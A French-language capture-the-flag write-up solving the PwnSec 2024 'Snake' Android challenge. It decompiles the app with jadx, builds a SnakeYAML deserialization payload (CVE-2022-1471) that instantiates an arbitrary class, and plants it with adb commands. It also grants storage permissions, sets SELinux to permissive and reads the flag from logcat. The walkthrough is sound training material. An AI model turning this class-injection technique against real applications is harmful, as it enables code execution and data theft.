# Lab 19 – Snake :PwnSec CTF 2024 – Mobile Hard


---

## Objectif

Exploiter une vulnérabilité de désérialisation YAML (CVE-2022-1471 – SnakeYAML) dans une application Android protégée par des mécanismes anti-root, anti-émulateur et anti-Frida, pour déclencher l'instanciation de la classe `BigBoss` et récupérer le flag dans logcat.

---

## Environnement de travail

| Composant | Détail |
|---|---|
| OS analyse | Kali Linux (VMware) |
| OS exploitation | Windows (machine physique) |
| Émulateur Android | Android Studio AVD – API 28 (Android 9) – x86 |
| ADB | 1.0.41 |
| apktool | 2.7.0 |
| jadx | 1.5.5 |
| apksigner | 0.9 (via `/usr/lib/android-sdk/build-tools/debian/`) |

---

## Étape 0 – Préparation de l'environnement

### Sur Kali Linux

```bash
# Vérifier les outils
adb --version
apktool --version
jadx --version

# Installer les manquants si nécessaire
sudo apt update && sudo apt install apktool jadx adb -y

# Ajouter apksigner au PATH
echo 'export PATH=$PATH:/usr/lib/android-sdk/build-tools/debian' >> ~/.bashrc
source ~/.bashrc

# Créer le dossier de travail
mkdir -p ~/snake_lab
cd ~/snake_lab

# Générer un keystore pour signer l'APK patché (si nécessaire plus tard)
keytool -genkey -v \
  -keystore ~/snake_lab/test.jks \
  -alias snake \
  -keyalg RSA \
  -keysize 2048 \
  -validity 365 \
  -storepass android \
  -keypass android \
  -dname "CN=Test, OU=Test, O=Test, L=Test, S=Test, C=US"
```

### Récupérer l'APK

```bash
cd ~/snake_lab
wget https://lautarovculic.com/my_files/snake.zip
unzip snake.zip
mv snake/snake.apk ~/snake_lab/
ls -la
```
<img width="962" height="388" alt="Capture d&#39;écran 2026-05-24 155841" src="https://github.com/user-attachments/assets/960e4b78-066a-4985-9e97-93811a43cab4" />
<img width="598" height="147" alt="Capture d&#39;écran 2026-05-24 155908" src="https://github.com/user-attachments/assets/4b58c4c8-00db-48af-a41b-059d766f19b4" />


### Sur Windows – Lancer l'émulateur

1. Ouvrir Android Studio → **Device Manager**
2. Créer un AVD : **Pixel 4 – API 28 – x86 – sans Google Play**
3. Lancer l'AVD (triangle vert ▶)
4. Vérifier dans CMD :

```cmd
adb devices
:: Résultat attendu :
:: emulator-5556   device
```
<img width="678" height="114" alt="image" src="https://github.com/user-attachments/assets/4f54ce0e-a239-4542-99ee-691f3a74ea55" />

---

## Étape 1 – Analyse statique avec Jadx

```bash
# Sur Kali
jadx-gui ~/snake_lab/snake.apk &
```

### Classe `MainActivity` – Points clés

```
Source code → com → pwnsec → snake → MainActivity
```
<img width="943" height="724" alt="Capture d&#39;écran 2026-05-24 160203" src="https://github.com/user-attachments/assets/d5fba9f9-7272-439c-9726-33b4ddb4742d" />

**Mécanismes de protection détectés :**
- `checkForDangerousBinaries()` – cherche `/sbin/su`, `/system/bin/su`, etc.
- `checkForRootManagementApps()` – détecte SuperSU, Magisk, etc.
- `checkForRootShell()` – exécute `which su`
- `checkForWritableSystem()` – tente d'écrire dans `/system`

**Flux principal de la méthode `C()` :**

```java
String stringExtra = intent.getStringExtra("SNAKE");
if (intent.hasExtra("SNAKE") && stringExtra.equals("BigBoss")) {
    // Lit /storage/emulated/0/snake/Skull_Face.yml
    // Parse avec SnakeYAML → instancie BigBoss("Snaaaaaaaaaaaaaake")
}
```
<img width="948" height="748" alt="Capture d&#39;écran 2026-05-24 160209" src="https://github.com/user-attachments/assets/1ac6fd69-f3b8-4e33-ae94-986ae6286d1e" />

### Classe `BigBoss` – Logique du flag

```java
public class BigBoss {
    static {
        System.loadLibrary("snake");  // bibliothèque native
    }

    public BigBoss(String str) {
        String strStringFromJNI = stringFromJNI(str);
        if (str.equals("Snaaaaaaaaaaaaaake")) {
            Log.d("BigBoss: ", hexToAscii(strStringFromJNI));  // flag ici
        }
    }

    private String hexToAscii(String str) {
        StringBuilder sb = new StringBuilder();
        int i2 = 0;
        while (i2 < str.length()) {
            int i3 = i2 + 2;
            sb.append((char) Integer.parseInt(str.substring(i2, i3), 16));
            i2 = i3;
        }
        return sb.toString();
    }

    public native String stringFromJNI(String str);
}
```

**Conclusion :** `BigBoss("Snaaaaaaaaaaaaaake")` → `stringFromJNI()` retourne le flag en hexadécimal → `hexToAscii()` le convertit → affiché dans logcat via `Log.d`.

### Vulnérabilité identifiée : CVE-2022-1471 (SnakeYAML)

SnakeYAML permet l'instanciation arbitraire de classes Java via la syntaxe `!!com.package.ClassName [args]`. L'app parse un fichier YAML externe sans validation → injection de classe possible.

---

## Étape 2 – Installation de l'APK sur l'émulateur

```cmd
:: Sur Windows CMD
adb -s emulator-5556 install C:\Users\a\snake_lab\snake\snake.apk
```
<img width="429" height="770" alt="Capture d&#39;écran 2026-05-24 155720" src="https://github.com/user-attachments/assets/a8a6e23e-7c0f-48e5-9662-6b8f03a3302b" />

> **Note :** L'émulateur Android Studio API 28 standard n'est pas rooté, donc les checks anti-root passent naturellement. Pas besoin de patcher le Smali dans ce cas.

---

## Étape 3 – Création du payload YAML

La vulnérabilité CVE-2022-1471 permet d'instancier `BigBoss` directement via SnakeYAML.

**Payload :**
```yaml
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
```

### Créer le dossier sur l'émulateur

```cmd
adb -s emulator-5556 shell mkdir -p /sdcard/snake
```

### Créer le fichier YAML (méthode fiable via shell)

```cmd
adb -s emulator-5556 shell "echo '!!com.pwnsec.snake.BigBoss [\"Snaaaaaaaaaaaaaake\"]' > /sdcard/snake/Skull_Face.yml"
```
<img width="931" height="119" alt="image" src="https://github.com/user-attachments/assets/e580ecfe-377b-4722-8912-8c24e0446f74" />


### Vérifier le contenu

```cmd
adb -s emulator-5556 shell cat /sdcard/snake/Skull_Face.yml
```
<img width="905" height="75" alt="image" src="https://github.com/user-attachments/assets/de1b299b-fee1-48fc-ad26-271e5625fa5e" />

---

## Étape 4 – Accorder les permissions de stockage

L'app a besoin de lire le fichier sur le stockage externe.

```cmd
adb -s emulator-5556 shell pm grant com.pwnsec.snake android.permission.READ_EXTERNAL_STORAGE
adb -s emulator-5556 shell pm grant com.pwnsec.snake android.permission.WRITE_EXTERNAL_STORAGE

:: Vérifier
adb -s emulator-5556 shell dumpsys package com.pwnsec.snake | findstr "READ_EXTERNAL"
:: Résultat attendu : granted=true
```
<img width="935" height="161" alt="image" src="https://github.com/user-attachments/assets/1fd9f56f-bfea-407f-b3a5-c55b0c5760f5" />

---

## Étape 5 – Désactiver SELinux (si blocage)

Si les logs montrent des erreurs `avc: denied`, SELinux bloque la lecture du fichier.

```cmd
adb -s emulator-5556 shell su 0 setenforce 0
:: Ou si root disponible :
adb -s emulator-5556 shell setenforce 0
```

> ℹ️ Sur un émulateur API 28 standard sans Google Play, `setenforce 0` fonctionne généralement depuis le shell ADB.

---

## Étape 6 – Déclencher l'exploit via Intent ADB

```cmd
adb -s emulator-5556 shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
:: Résultat attendu :
:: Starting: Intent { cmp=com.pwnsec.snake/.MainActivity (has extras) }
```
<img width="953" height="124" alt="image" src="https://github.com/user-attachments/assets/f1f59d3b-2e90-4588-8866-10133ad6b9aa" />

Ce que cela fait :
1. Lance `MainActivity` avec l'extra `SNAKE=BigBoss`
2. `MainActivity.C()` détecte l'extra → lit `/sdcard/snake/Skull_Face.yml`
3. SnakeYAML parse le payload → instancie `BigBoss("Snaaaaaaaaaaaaaake")`
4. `BigBoss` appelle `stringFromJNI()` → reçoit le flag en hex
5. `hexToAscii()` convertit → `Log.d("BigBoss: ", flag)`

---

## Étape 7 – Récupérer le flag dans logcat

### Ouvrir un second CMD et surveiller les logs

```cmd
adb -s emulator-5556 logcat | findstr /i "BigBoss"
```
<img width="1919" height="973" alt="Capture d&#39;écran 2026-05-24 163406" src="https://github.com/user-attachments/assets/03c03a7a-ab91-4fa2-b17f-670993818edc" />

### Résultat

```
05-24 15:27:39.662  27463  27463  D BigBoss: : PWNSEC{W3'r3_N0t_T00l5_0f_The_g0v3rnm3n7_0R_4ny0n3_3ls3}
05-24 15:27:39.662  27463  27463  D Skull Face data: : com.pwnsec.snake.BigBoss@14a52b7
```

---

## Flag

```
PWNSEC{W3'r3_N0t_T00l5_0f_The_g0v3rnm3n7_0R_4ny0n3_3ls3}
```

---

## Résumé du flux d'exploitation

```
APK (snake.apk)
  │
  ├─ Analyse statique (jadx-gui)
  │    ├─ MainActivity.C() → lit Skull_Face.yml → SnakeYAML → instancie BigBoss
  │    └─ BigBoss(str) → stringFromJNI() → hexToAscii() → Log.d (flag)
  │
  ├─ Payload YAML (CVE-2022-1471)
  │    └─ !!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
  │
  ├─ Préparation émulateur
  │    ├─ adb install snake.apk
  │    ├─ mkdir /sdcard/snake
  │    ├─ push Skull_Face.yml
  │    ├─ pm grant READ_EXTERNAL_STORAGE
  │    └─ setenforce 0 (si nécessaire)
  │
  ├─ Déclenchement
  │    └─ adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
  │
  └─ Récupération
       └─ adb logcat | findstr "BigBoss" → FLAG ✅
```

---

## Concepts clés appris

| Concept | Description |
|---|---|
| **CVE-2022-1471** | Désérialisation arbitraire via SnakeYAML – instanciation de classes Java depuis YAML |
| **Android Intent exploitation** | Envoi d'extras via `adb shell am start -e` pour déclencher des chemins de code spécifiques |
| **Analyse statique (jadx)** | Décompilation d'APK en Java lisible pour comprendre la logique applicative |
| **ADB shell pm grant** | Octroi de permissions runtime depuis la ligne de commande |
| **SELinux permissive mode** | Désactivation temporaire pour débloquer des restrictions d'accès fichier |
| **Logcat forensics** | Surveillance des logs Android pour extraire des données sensibles |
| **Anti-tampering bypass** | Émulateur standard API 28 sans root → les checks passent nativement |

---
